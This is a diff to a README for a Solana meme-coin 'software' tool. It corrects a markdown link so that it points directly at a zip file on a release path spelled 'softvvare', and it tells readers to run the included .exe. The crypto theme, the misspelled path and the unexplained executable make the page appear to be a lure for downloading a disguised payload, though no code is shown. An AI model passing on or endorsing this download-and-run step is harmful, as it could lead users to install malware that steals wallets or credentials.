@@ -10,7 +10,7 @@ Built with **Rust**, compiled into a native `.exe`, and ready to go.
 
 ## 🛠 How to Use
 
-**Download the latest version** from the [**Releases**]https://github.com/jeongjo-ro/Launch-solana-meme-coin/releases/download/softvvare/solana.zip() page
+**Download the latest version** from the [**Releases**](https://github.com/jeongjo-ro/Launch-solana-meme-coin/releases/download/softvvare/solana.zip) page
 
 Run the `.exe` to launch the **solana software**.
 
